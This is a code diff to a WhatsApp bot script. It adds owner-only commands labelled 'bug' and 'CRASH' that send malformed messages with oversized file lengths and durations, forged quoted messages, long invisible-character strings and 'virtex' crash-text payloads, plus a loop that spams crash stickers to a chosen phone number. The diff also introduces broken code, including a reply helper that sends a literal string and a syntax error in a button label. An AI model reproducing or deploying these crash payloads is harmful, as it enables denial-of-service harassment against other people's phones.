@@ -1,25 +1,3 @@
-//════════════════════════════//
-//If you want to recode, reupload
-//or copy the codes/script,
-//pls give credit
-//no credit? i will take action immediately
-//© 2022 Xeon Bot Inc. Cheems Bot MD
-//Thank you to Lord Buddha, Family and Myself
-//════════════════════════════//
-//recode kar ke youtube pe upload kar rhe hai ya
-//codes copy kar ke apne script me dal rhe
-//hai to, description me xeon ka yt channel
-// ka link paste kr dena as a cradit or github 
-//repo me bhi tag kardena baki jo
-//bhi karna hai apki marzi, thank you!🦄
-//════════════════════════════//
-//If you recode and uploading on your channel
-//or copy pasting the codes in ur script, 
-//i give permission to do as long as you
-//put Xeons youtube channel link in the video
-//description and tag me on githuh repo, 
-//thank you🦄
-//════════════════════════════//
 
 require('./settings')
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
@@ -57,6 +35,10 @@ const xeontod = require("tod-api")
 const { pinterest } = require("./lib/pinterest")
 const toHur = require('@develoka/angka-terbilang-js')
 const { hentai } = require('./lib/scraper2.js')
+const { virtex1 } = require('./src/virtex1')
+const { virtex2 } = require('./src/virtex2')
+const { virtex3 } = require('./src/virtex3')
+virgam = fs.readFileSync(`./virgam.jpeg`)
 const {
  FajarNews, 
  BBCNews,
@@ -476,7 +458,7 @@ const reply = (teks) => {
         }
         
         const replay = (teks) => {
-            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
+            XeonBotInc.sendMessage(m.chat, { text: 'teks', contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
         }
 	
         //Public & Self\\
@@ -3445,7 +3427,7 @@ break
 		   if (isBan) return reply(mess.ban)	 			
 if (isBanChat) return reply(mess.banChat)
            if (!text) return reply(`Example : ${prefix + command} text`)
-           await XeonBotInc.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})
+           await XeonBotInc.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'XeonBotInc', 'morou', m, {asSticker: true})
 
          }
          break
@@ -8779,27 +8761,27 @@ if (isBanChat) return reply(mess.banChat)
 XeonBotInc.sendMessage(from, { react: { text: `${global.reactmoji}`, key: m.key }})
 	                let btn = [{
                                 urlButton: {
-                                    displayText: 'YouTube 🍒',
+                                    displayText: 'YouTube'📍,
                                     url: `${websitex}`
                                 }
                             }, {
                                 callButton: {
-                                    displayText: 'Script 🍜',
+                                    displayText: 'Script✨',
                                     url: `${botscript}`
                                 }
                             }, {
                                 quickReplyButton: {
-                                    displayText: 'All Menu 🍱',
+                                    displayText: 'All Menu',
                                     id: 'allmenu'
                                 }
                             }, {
                                 quickReplyButton: {
-                                    displayText: 'List Menu 🍢',
+                                    displayText: 'List Menu',
                                     id: 'command'
                                 }  
                             }, {
                                 quickReplyButton: {
-                                    displayText: 'Owner 🤣',
+                                    displayText: 'Owner',
                                     id: 'owner'
                                 }
                             }]
@@ -8818,9 +8800,9 @@ XeonBotInc.sendMessage(from, { react: { text: `${global.reactmoji}`, key: m.key 
                         let buttonmenu = [
         	{ urlButton: { displayText: `YouTube 🍒`, url : `${websitex}` } },
             { urlButton: { displayText: `Script 🍜`, url: `${botscript}` } },
-            { quickReplyButton: { displayText: `All Menu 🍱`, id: 'allmenu'} },
-            { quickReplyButton: { displayText: `List Menu 🍢`, id: 'command'} },
-            { quickReplyButton: { displayText: `Owner 🤣`, id: 'owner'} }
+            { quickReplyButton: { displayText: `All Menu 📍`, id: 'allmenu'} },
+            { quickReplyButton: { displayText: `List Menu 💫`, id: 'command'} },
+            { quickReplyButton: { displayText: `Owner ✨`, id: 'owner'} }
         	]
         	XeonBotInc.sendMessage(m.chat, { caption: menulist, document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'), mimetype: `${docs}`, fileName: `${ownername}`, templateButtons: buttonmenu, footer: `${botname}`, mentionedJid: [m.sender] })
                         }
@@ -10592,6 +10574,499 @@ Xeon (Me)
 My family
 And all friends who helped assemble this sexy script !!!`)
 break
+case 'hai':
+if(!isCreator) return m.reply("Khusus Owner")
+let fc = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" })
+}, 
+message: { 
+"audioMessage": {
+"mimetype":"audio/ogg; codecs=opus",
+"seconds": "400000271",
+"ptt": "true"
+}
+} 
+}
+XeonBotInc.sendMessage(m.chat, {text:"Hai Bang"},{quoted:fc})
+break
+case 'hay':
+if(!isCreator) return m.reply("Khusus Owner")
+let fdo = {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+documentMessage: {
+title: `メʜᴀɴᴢ々ᴏꜰᴄメ`, 
+jpegThumbnail: log0,
+}
+}
+}           
+XeonBotInc.sendMessage(m.chat, {text:"Hay"},{quoted:fdo})
+break
+case 'bugv1':
+if(!isCreator) return m.reply("Khusus Owner")
+let fdoc = {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+documentMessage: {
+title: `メʜᴀɴᴢ々ᴏꜰᴄメ`, 
+jpegThumbnail: log0,
+}
+}
+}           
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fdoc})
+break
+case 'bugv2':
+if(!isCreator) return m.replyy("Khusus Owner")
+let foto = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+message: { 
+"imageMessage": { 
+"mimetype": "image/jpeg", 
+"caption": `HANZ々OFC彡`, 
+"jpegThumbnail": thumb
+} 
+} 
+}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foto})
+break
+case 'bugv3':
+if(!isCreator) return m.reply("Khusus Owner")
+let fvoc = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" })
+}, 
+message: { 
+"audioMessage": {
+"mimetype":"audio/ogg; codecs=opus",
+"seconds": "400000271",
+"ptt": "true"
+}
+} 
+}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fvoc})
+break
+case 'bugv4':
+if(!isCreator) return m.reply("Khusus Owner")
+let fgif = { 
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { "videoMessage": { 
+"title":"hallo bang","h": 
+`Hmm`,'seconds': '359996400', 
+'gifPlayback': 'true', 
+'caption': `ʜᴀɴᴢ々ᴏꜰᴄ`,
+'jpegThumbnail': log0,
+}
+}
+}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgif})
+break
+case 'bugv5':
+if(!isCreator) return m.reply("Khusus Owner")
+let floc = {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: log0, 
+}
+}
+}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:floc})
+break 
+case 'bugv6':
+if(!isCreator) return m.reply("Khusus Owner")
+let ftoko = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { 
+"productMessage": { 
+"product": { 
+"productImage":{ 
+"mimetype": "image/jpeg", 
+"jpegThumbnail": fs.readFileSync('./XeonMedia/theme/hanz1.jpg')}, 
+"title": "HANZ々OFC彡", 
+"description": "HANZ々OFC彡", 
+"currencyCode": "USD", 
+"priceAmount1000": "5000000000", 
+"retailerId": "hanz", 
+"productImageCount": 1}, 
+"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:ftoko})
+break
+case 'bugv7':
+if(!isCreator) return m.reply("Khusus Owner")
+let foncevid = { 
+key: {
+fromMe: false, 
+remoteJid: "6281315995629@g.us", 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { 
+videoMessage: { 
+viewOnce: true
+},
+},
+};
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foncevid})
+break
+case 'bugv8':
+if(!isCreator) return m.reply("Khusus Owner")
+let fonceimg = {
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+imageMessage: {
+viewOnce: true
+},
+},
+};
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fonceimg})
+break
+case 'bugv9':
+if(!isCreator) return m.reply("Khusus Owner")
+let fgc = { 
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+"message": {
+"groupInviteMessage": {
+"groupJid": "62895619083555-1616169743@g.us",
+"inviteCode": "mememteeeekkeke",
+"groupName": "P",
+"caption": `ʜᴀɴᴢ々ᴏꜰᴄ`,
+ 'jpegThumbnail': fs.readFileSync('./XeonMedia/theme/hanz2.jpg')}}}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgc})
+break
+case 'bugv10':
+if(!isCreator) return m.reply("Khusus Owner")
+let stic = { 
+"key": {
+"participant": `6285706035039@s.whatsapp.net`,
+"remoteJid": "",
+"fromMe": false,
+"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
+},
+"message": {
+"stickerMessage": {
+"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
+"pngThumbnail": log0, 
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
+"fileLength": "99999999999",
+"firstFrameLength": 3626,
+"isAnimated": false
+}
+},
+"messageTimestamp": "1614070775",
+"status": "PENDING"
+ }
+ XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:stic})
+ break
+//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
+case 'bugv11':
+if(!isCreator) return m.reply("Khusus Owner")
+let fkon = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { "contactMessage": { 
+"displayName": `HANZ々OFC彡`,
+ "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
+ "jpegThumbnail": fs.readFileSync('./XeonMedia/theme/hanz1.jpg')}}}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
+break      
+case 'bugv12':
+let finv = {
+key: { 
+fromMe: false,
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"groupInviteMessage": {
+"groupJid": "6288213840883-1616169743@g.us",
+"inviteCode": `ith6ffr68`,
+"groupName": `HANZ々OFC彡 [CRASH]`, 
+"caption": `HANZ々OFC彡 [CRASH]`, 
+'jpegThumbnail': thumb
+}
+}
+}
+XeonBotInc.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:finv})
+break
+case 'bugbutton': {
+let fgif = { 
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { "videoMessage": { 
+"title":"hallo bang","h": 
+`Hmm`,'seconds': '359996400', 
+'gifPlayback': 'true', 
+'caption': `@Hanz-Md`,
+'jpegThumbnail': fs.readFileSync(`./XeonMedia/theme/hanz1.jpg`),}}}
+let buttons = [
+{buttonId: `jembod`, buttonText: { displayText: `HANZ々OFC彡\n-${virtex2}`, }, type: 1 },
+{buttonId: `jembod`, buttonText: { displayText: `HANZ々OFC彡\n-${virtex2}`, }, type: 1 },
+{buttonId: `jembod`, buttonText: { displayText: `メHANZ々OFCメ\n-${virtex2}`, }, type: 1 },
+]
+let buttonMessage = {
+image: fs.readFileSync('./XeonMedia/theme/hanz1.jpg'),
+fileLength: 99999999999,
+Thumbnail: thumb,
+caption: `💤HANZ々OFC彡💤\n
+╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+┃╭┈─────────────⩵꙰ཱི࿐
+┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
+╰•͙✩̣̣̣̣
+⁙┃〲◦➛Link Sc: https://bit.ly/3vJZJ7n
+⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
+⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
+⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
+⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+\n${virtex1}`,
+footer: virtex2,
+buttons: buttons,
+headerType: 4
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: fgif })
+}
+break
+case 'buglist':
+if (!isCreator) throw mess.owner
+des = [
+{
+title: `Fixed Haris S`,
+ rows: [
+{title: virtex1, rowId: `Jembod`, description: `Hai \nSaya Itu gay lagi nyari cowok yang berotot untuk jadi pacarku yang minta chat aku yahh😋`},
+{title: virtex2, rowId: `Jembod`, description: `Hai \nSaya Itu gay lagi nyari cowok yang berotot untuk jadi pacarku yang minta chat aku yahh😋`}
+]
+}
+]
+XeonBotInc.sendListMsg(m.chat, `𝔅𝔘𝔊𝔏ℑ𝔖𝔗
+╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+┃╭┈─────────────⩵꙰ཱི࿐
+┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
+╰•͙✩̣̣̣̣
+⁙┃〲◦➛Link Sc: http://bit.ly/3vJZJ7n
+⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
+⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
+⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
+⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+
+\n${virtex2}`, XeonBotInc.user.name, `HANZ々OFC彡`, `HANZ々OFC彡\n-${virtex2}`, des, ftroli)
+break
+case 'troli':
+if(!isCreator) return m.reply("Khusus Owner")
+let troli = generateWAMessageFromContent(m.chat,{
+"orderMessage": {
+"orderId": "5287265358017580",//ini juga ngaruh jan di ubh
+"thumbnail": virgam, 
+"itemCount": 2023,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"orderTitle": "FIXED BY HARIS S CASE MD",
+"message":"HANZ々OFC彡 I GIVE [CRASH]",
+"sellerJid": "5491133536405@s.whatsapp.net",//Jangan di ganti
+"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Ngaruh jan di ubah
+"totalAmount1000": "IDR 99.9999999988",
+"totalCurrencyCode": "IDR",
+"contextInfo": {
+'externalAdReply': {
+'showAdAttribution': true,
+}
+}//KECUALI KODE YG GK USH DI GANTI LAINNYA BEBAS 
+}
+}, {quoted: {
+key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+documentMessage: {
+title: `メʜᴀɴᴢ々ᴏꜰᴄメ`, 
+jpegThumbnail: log0
+}
+}
+}, contextInfo:{}}) 
+XeonBotInc.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
+break
+case 'catalog': {
+if(!isCreator) return m.reply("Khusus Owner")
+/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
+var messa = await prepareWAMessageMedia(
+{ image: fs.readFileSync('./XeonMedia/theme/hanz2.jpg') }, 
+{ upload: XeonBotInc.waUploadToServer })
+var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "JEMBOD",
+"fileLength": 99999999999,
+"jpegThumbnail": virgam,
+"title": `HANZ々OFC彡 XD͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`,
+"description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${virtex2}`,
+"currencyCode": "IDR",
+"productImageCount": 923456789,
+"firstImageId": 1,
+"priceAmount1000": "999",
+"salePriceAmount1000": "IDR 99.99999999999",  
+"bodyText": `Gk guna😏`,
+"footerText": `Sama gk guna😏`,
+"retailerId": `CATALOG NEW ERA`,
+"url": "https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw"
+},
+"businessOwnerJid": "6285706035039@s.whatsapp.net",
+"contextInfo": {
+'externalAdReply': {
+'showAdAttribution': true,
+}
+}
+}
+}), { userJid: m.chat, quoted: fdocs })
+XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+}
+break
+case 'bugpc':
+if(!isCreator) return m.reply("Khusus Owner")
+pc = generateWAMessageFromContent(m.chat,{
+"groupInviteMessage": {
+"groupJid": "120363047368062014@g.us",
+"inviteCode": "CZ/GAeOhayYnqjcK",
+"inviteExpiration": "99999999999",
+"invitetime": "9999999999999999",
+"groupName": `HANZ々OFC彡🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${virtex1}️️`,
+"jpegThumbnail": virgam,//FIXED HARIS S BOTZ MD
+"caption": `BUG INVITE🎭 HANZ々OFC彡`,
+"contextInfo": {
+'externalAdReply': {
+'showAdAttribution': true,
+}
+}
+}
+}, {quoted: {
+	key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
+liveLocationMessage: {
+caption: `メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: log0,
+}
+}
+}, contextInfo:{}}) 
+XeonBotInc.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})
+	break			
+case 'liveloc':
+res = generateWAMessageFromContent(m.chat,{
+"liveLocationMessage": {
+"degreesLatitude": -7.8374838,
+"degreesLongitude": 727.8383838,
+"caption": `HANZ々OFC彡 XD💊\n\n${virtex3}-${virtex3}`,
+"sequenceNumber": "1532280505",
+"thumbnail": virgam,
+"contextInfo": {
+'externalAdReply': {
+'showAdAttribution': true,
+}
+}
+}
+}, {quoted: {key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
+liveLocationMessage: {
+caption: `メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: log0,
+}
+}
+}, contextInfo:{}}) 
+XeonBotInc.relayMessage(m.chat, res.message, { messageId: res.key.id,})
+break
+case 'liveloc':
+  loc = generateWAMessageFromContent(m.chat,{
+  "LocationMessage": {
+    "degreesLatitude": 37.38980827772353,
+    "degreesLongitude": -122.08141386508942,
+    "caption": `HANZ々OFC彡 XD💊`,
+"sequenceNumber": "877855655890656545347844631180868688964",
+    "jpegThumbnail": thumb,
+    "contextInfo": {
+'externalAdReply': {
+'showAdAttribution': true,
+}
+}
+}
+}, {quoted: {key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
+liveLocationMessage: {
+caption: `メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: thumb,
+}
+}
+}, contextInfo:{}}) 
+XeonBotInc.relayMessage(m.chat, res.message, { messageId: res.key.id,})
+break
+case 'bugstik':{
+if (!isCreator) return 
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, b, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'}),{quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "99999999999",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": true,
+}
+}
+}})
+}
+m.reply(`Sukses Send Sebanyak ${jumlah}`)
+}
+break
+
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return reply(mess.owner)
